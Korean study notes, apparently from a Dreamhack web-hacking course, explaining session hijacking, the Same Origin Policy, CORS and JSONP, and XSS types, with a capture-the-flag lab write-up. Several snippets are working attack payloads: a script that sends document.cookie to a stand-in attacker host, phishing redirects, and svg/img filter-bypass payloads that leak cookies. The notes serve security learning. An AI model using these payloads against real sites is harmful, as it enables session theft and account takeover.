# 웹 해킹 개요  
웹 해킹은 해킹의 의미처럼 본래의 의도와는 다른 동작을 일으키도록 하거나, 주어진 권한 이상으로 정보를 열람, 복제, 변경 가능한 행위가 웹에서 발생하는 것.  

기업의 업무, 금융, 쇼핑 등 다양한 분야가 웹으로 서비스되면서 제공하는 서비스의 복잡도와 다양성이 증가.  
그로 인해 서버와 어플리케이션에서 처리하는 사용자의 입력 역시 다양해졌고 기능을 구현하면서 높아진 복잡도로 인해  
개발 당시에는 의도치 않았던 동작을 일으킬 수 있는 웹 해킹의 위협도 증가.  

많은 기업들이 자산을 보호하기 위해 많은 서비스와 네트워크 망을 내부망에서 사용하지만, 기업의 대표 사이트 또는 제품(서비스) 등과 같이 웹을 통해 서비스를 운영하는 경우가 많음.  
이런 웹 서비스들은 내부망과 연결되어 있을 가능성이 높아 공격자들이 내부망 침투를 위해 가장 먼저 웹을 공격하기도 함.  

## 웹 해킹 공격 벡터  
<img width="470" alt="4" src="https://user-images.githubusercontent.com/46364778/93002223-6f429c00-f570-11ea-903e-541668ed6325.PNG">  

드림핵 웹사이트 접속 시 발생하는 과정 간략히 표현  
* Client-side : 사용자의 입력을 받고 웹사이트와 통신  
* Server-side : 사용자의 요청 처리  

웹 해킹을 할 때에도 Client-side, Server-side로 공격 대상을 나누어볼 수 있다.  
공격 대상에 따라 공격하는 방식, 형태가 달라지며 공격을 통해 가능한 행위가 달라짐.  

### Client-side Attack  
서비스 사용자에 대한 공격  

웹을 이용하는 사용자는 웹브라우저를 통해 서비스 제공 받는데  
**웹 서버가 제공해주는 데이터**가 공격자에 의해 변조되었을 경우  
**웹 브라우저에서 렌더되는 과정**에서 취약점이 발생하는 경우가 대표적인 공격 형태  
> ex) 게시판 서비스 - 사용자의 입력을 특별한 검증 없이 출력하게 되면 사용자의 입력도 html처럼 취급되고 스크립트도 삽입 가능  
이를 악용하여 공격자는 다른 사용자의 웹 브라우저에 원하는 행위 수행 가능  

### Server-side Attack  
서비스를 운용하는 서버에 대한 공격  

다양한 공격 형태 존재, 공격자가 공격에 성공하게 되면 서버의 어플리케이션 코드 또는 다른 사용자의 정보 유출, 서버 탈취 등의 공격으로 발전될 수 있다.  
운영되는 서비스의 구조와 특징에 따라 위협의 형태가 달라짐.  
> 서비스의 형태에 따라 가지게 되는 특별한 공격 방법이 존재.  
ex) 송금 기능을 지원하는 서비스에서 자신이 가진 금액보다 더 큰 금액으로 요청하게 될 때 특별한 검증 절차 없이 정상적으로 진행된다며, 공격자는 금전적 이득 취득 가능  


## Client: 세션 하이재킹(Session Hijacking)  
쿠키에는 세션 정보가 저장되어 있고 서버는 이를 통해 이용자를 식별하고 인증을 처리함.  
공격자가 이용자의 쿠키를 훔칠 수 있으면 세션에 해당하는 이용자의 인증 상태를 훔칠 수 있는데, 이를 세션 하이재킹이라고 한다.  

드림핵 로그인 기능을 통해 세션을 알아보자.  
> 1. 드림핵 로그인 페이지에서 우클릭 후 검사를 클릭하고 Network 탭을 누릅니다.  
> Preserve log를 체크하고 로그인을 하면 로그인 성공 시 응답을 볼 수 있습니다.  
> 응답을 살펴보면, 서버에서 set-cookie 헤더를 통해 브라우저의 쿠키에 세션 정보를 저장하는 것을 볼 수 있습니다.  
> 2. 크롬 검사에서 Application을 누르고 Cookies 목록 안의 https://dreamhack.io 를 누르면 서버의 set-cookie 헤더를 통해 설정된 쿠키를 확인할 수 있습니다.  
> 3. sessionid 헤더의 값을 메모장에 복사합니다.  
> 이후 사진과 같이 sessionid 헤더의 값을 우클릭한 후 Delete를 클릭하면 브라우저의 쿠키에 저장된 세션 값이 삭제됩니다.  
> 세션 값을 삭제하고 드림핵 페이지를 새로고침하면 로그인이 풀려있는 것을 확인할 수 있습니다.
> 4. 쿠키의 빈 칸을 더블 클릭해 sessionid 헤더를 추가하고, 이전에 복사한 세션 값을 입력하면 브라우저의 쿠키에 세션 값이 설정됩니다.  
> 세션 값을 설정하고 드림핵 페이지를 새로고침하면 로그인이 되는 것을 확인할 수 있습니다.  

## Client: Same Origin Policy  
쿠키, 세션 하이재킹을 방지하기 위해 동일 출처 정책, Same Origin Policy(SOP) 보안 매커니즘이 탄생.  
SOP는 클라이언트 사이드 웹 보안에 있어 중요한 요소.  
실제로 클라이언트 사이드 공격은 이 SOP를 우회하기 위한 것이라고 해도 과언이 아님.  
> 브라우저는 인증 정보로 사용될 수 있는 쿠키를 브라우저 내부에 저장.  
> 이용자가 웹 서비스에 접속할 때, 브라우저는 해당 웹 서비스에서 사용하는 인증 정보인 쿠키를 HTTP 정보에 포함시켜 전달.  
> 뿐만 아니라, 브라우저는 웹 리소스를 통해 간접적으로 타 사이트에 접근할 때도 인증 정보인 쿠키를 함께 전송하는 특징을 가지고 있음.  

클라이언트 입장에서는 가져온 데이터를 악의적인 페이지에서 읽을 수 없도록 해야함. 이것이 바로 SOP.  

### ORIGIN 구분 방법  
ORIGIN은 프로토콜(Protocol Scheme), 포트(Port), 호스트(Host)로 구성. 구성요소가 모두 일치해야 동일한 오리진이라고 함.  
ex) https://same-origin.com/  
|URL|결과|이유|  
|:----:|:---:|:---:|  
|https://same-origin.com/frame.html|Same Origin|Path만 다름|  
|http://same-origin.com/frame.html|Cross Origin|Scheme이 다름|  
|https://cross.same-origin.com/frame.html|Cross Origin|Host가 다름|  
|https://same-origin.com:1234/|Cross Origin|Port가 다름|  

SOP는 Cross Origin이 아닌 Same Origin 일 때만 정보를 읽을 수 있도록 해줌.  
외부 출처에서 불러온 데이터를 읽으려고 할 때는 오류가 발생.  
하지만 읽는 것 외에 데이터를 쓰는 것은 문제 없이 작동.  

### Cross Origin Resource SHaring(CORS)  
브라우저가 SOP에 구애 받지 않고 외부 출처에 대한 접근을 허용해주는 경우가 존재.  
ex) 이미지, 자바스크립트, CSS 등 리소스를 불러오는 \<img\>, \<style\>, \<script\> 등의 태그  
그리고 웹 서비스에서 동일 출처 정책인 SOP를 완화하여 다른 출처의 데이터를 처리해야하는 경우도 있음.  

위 같은 상황에서 자원을 공유하기 위해 사용할 수 있는 공유 방법을 교차 출처 리소스 공유(CORS)라고 함.  
CORS 방법은 관련된 HTTP 헤더를 추가하여 전송하는 방법. 이 외에도 JSON with Padding(JSONP) 방법을 통해 CORS를 대체할 수 있음.  

* HTTP 헤더에 기반  
발신 측에서 CROS 헤더를 설정해 요청하면, 수신 측에서 헤더를 구분해 정해진 규칙에 맞게 데이터를 가져갈 수 있도록 설정.  
> 발신 측에서 POST 방식으로 HTTP를 보냈으나, OPTIONS 메소드를 가진 HTTP 요청이 전달됨.  
> 이를 **CORS preflight**: 수신 측에 웹 리소스를 요청해도 되는지 질의하는 과정  

|Header|설명|  
|:---:|:---:|  
|Access-Control-Allow-Origin|헤더 값에 해당하는 Origin에서 들어오는 요청만 처리합니다.|  
|Access-Control-Allow-Methods|헤더 값에 해당하는 메소드의 요청만 처리합니다.|  
|Access-Control-Allow-Credentials|쿠키 사용 여부를 판단합니다. 예시의 경우 쿠키의 사용을 허용합니다.|  
|Access-Control-Allow-Headers|헤더 값에 해당하는 헤더의 사용 가능 여부를 나타냅니다.|  

> 브라우저는 수신측의 응답이 발신측의 요청과 상응하는지 확인하고, 그때야 비로소 POST 요청을 보내 수신측의 웹 리소스를 요청하는 HTTP 요청을 보냅니다.  

* JSONP  
이미지나 자바스크립트, CSS 등의 리소스는 SOP에 구애 받지 않고 외부 출처에 대해 접근을 허용.  
JSONP 방식은 이러한 특징을 이용해 \<script\> 태그로 Cross Origin의 데이터를 불러온다.  
하지만 \<script\> 태그 내에서는 데이터를 자바스크립트의 코드로 인식하기 때문에 Callback 함수를 활용해야 함!  
Cross Origin에 요청할 때 callback 파라미터에 어떤 함수로 받아오는 데이터를 핸들링할지 넘겨주면, 대상 서버는 전달된 Callback으로 데이터를 감싸 응답.  

> 웹 리소스 요청 코드  
```
<script>
/* myCallback이라는 콜백 함수를 지정합니다. */
function myCallback(data){
    /* 전달받은 인자에서 id를 콘솔에 출력합니다.*/
	console.log(data.id)
}
</script>
<!--
https://theori.io의 스크립트를 로드하는 HTML 코드입니다.
단, callback이라는 이름의 파라미터를 myCallback으로 지정함으로써
수신측에게 myCallback 함수를 사용해 수신받겠다고 알립니다.
-->
<script src='http://theori.io/whoami?callback=myCallback'></script>
```

> 웹 리소스 요청에 따른 응답 코드  
```
/*
수신측은 myCallback 이라는 함수를 통해 요청측에 데이터를 전달합니다.
전달할 데이터는 현재 theori.io에서 클라이언트가 사용 중인 계정 정보인
{'id': 'dreamhack'} 입니다. 
*/
myCallback({'id':'dreamhack'});
```

예시 코드 동작을 함께 살펴보자.  
13 번째 줄에서 Cross Origin의 데이터를 불러온다.  
이 때 callback 파라미터로 myCallback을 함께 전달한다.  
Cross Origin에서는 응답할 데이터를 myCallback 함수의 인자로 전달될 수 있도록 myCallback으로 감싸 Javascript 코드를 반환해준다.  
반환된 코드는 요청측에서 실행되기 때문에 3~6번 줄에서 정의된 myCallback 함수가 전달된 데이터를 읽을 수 있음.  

다만 JSONP는 CORS가 생기기 전에 사용하던 방법으로 현재는 거의 사용하지 않는 추세, 새롭게 코드를 작성할 때에는 CORS를 사용해야 함.  

## Client: Cross Site Scripting(XSS)  
공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하도록 함.  
해당 취약점을 통해 특정 계정의 세션 정보 탈취, 해당 계정으로 임의의 기능 수행 가능.  
> 해당 페이지에 접속하면 오리진 사이트가 명령한 것으로 해석하고 악성 스크립트 실행  

### XSS 발생 예시와 종류  
XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생  
ex) 로그인 시 출력되는 "안녕하세요 00회원님" 같은 문구, 게시글, 댓글  

클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청하고 서버로부터 받은 응답, 즉 HTML, CSS, JS 등의 웹 리소스를 시각화하여 이용자에게 보여줌.  
이때, HTML, CSS, JS와 같은 코드가 포함된 게시물을 조회할 경우 이용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있음.  

XSS는 발생 형태에 따라서 다양한 종류로 구분  

|종류|설명|  
|:---:|:---:|  
|Stored XSS|XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS|  
|Reflected XSS|XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS|  
|DOM-based XSS|XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS. (Fragment는 서버 요청/응답 에 포함되지 않습니다.)|  
|Universal XSS|클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS|  

### XSS 스크립트의 예시  
자바스크립트는 웹 문서의 동작을 정의. 공격자는 자바스크립트를 통해 이용자에게 보여지는 웹 페이지를 조작하거나, 웹 브라우저의 위치를 임의의 주소로 변경할 수 있음.  
자바스크립트는 다양한 동작을 정의할 수 있기 때문에 XSS 공격에 주로 사용됨. 실행하기 위한 태그로는 /<script/>가 있음.  

1. 쿠키 및 세션 탈취 공격 코드  
```
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```  

2. 페이지 변조 공격 코드  
```
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```  

3. 위치 이동 공격 코드  
```
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```  

### Stored XSS  
서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성스크립트를 조회할 때 발생하는 XSS  
대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음.  
게시물은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가짐.  
ex) 실습하면서 배운 것: 글 쓸 때 body(게시글) 부분에 써야 실행되는 듯 함. 제목 부분은 X.  

### Reflected XSS  
서버가 악성 스크립트가 담긴 요청을 출력하라 때 발생하는 XSS  
대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서, 스크립트를 포함해 검색하는 방식이 있음.  
이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환한다. 일부 서비스에서는 검색 결과를 응답에 포함하는데, 검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS가 발생할 수 있음.  

Reflected XSS는 Stored XSS와 다르게 URL과 같은 이용자의 요청에 의해 발생.  
따라서 공격을 위해서는 타 이용자에게 악성 스크립트가 포함된 링크에 접속하도록 유도해야함.  
이용자에게 링크를 직접 전달하는 방법은 악성 스크립트 포함 여부를 이용자가 눈치챌 수 있기 때문에 주로 **Click Jacking** 또는 **Open Redirect** 등 다른 취약점과 연계하여 사용.  

> 키워드  
> * Cross Site Scripting (XSS): 클라이언트 사이드 취약점, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 취약점  
> * Stored XSS: 악성 스크립트가 서버 내에 존재, 이용자가 저장된 악성 스크립트를 조회할 때 발생  
> * Reflected XSS: 악성 스크립트가 이용자 요청 내에 존재, 이용자가 악성 스크립트가 포함된 요청을 보낸 후 응답을 출력할 때 발생  

### 실습  
render_template 함수는 전달된 템플릿 변수를 기록할 때 HTML 엔티티코드로 변환해 저장하기 때문에 XSS가 발생하지 않음.  
이용자가 입력한 값을 페이지에 그대로 출력하면 XSS가 발생.  

#### 익스플로잇  
엔드포인트에서 발생하는 XSS 취약점을 통해 임의 이용자의 쿠키를 탈취해야 한다.  
탈취한 쿠키를 전달받기 위해서는 외부에서 접근 가능한 웹 서버를 이용하거나 문제에서 제공하는 다른 엔드포인트를 사용할 수 있음.  
* location.href: 전체 URL을 반환하거나, URL을 업데이트할 수 있는 속성값  
* document.cookie: 해당 페이지에서 사용하는 쿠키를 읽고, 쓰는 속성값  

### 방어법  
악성 태그를 필터링하는 HTML Sanitizaion을 사용하거나 엔티티코드로 치환하는 방법을 통해 해결할 수 있음.  

### XSS 우회법  
[치트시트](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)  

> xss-2 문제의 경우 \<script\>가 필터링됨.  
> HTML5의 경우 innerHTML로 들어간 script 태그는 실행되지 않음.([출처](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML))  
```<svg/onload=location["href"]="/memo?memo="+document["cookie"]>```  
```<img src="" onerror="location.href='/memo?memo='+document.cookie">```  


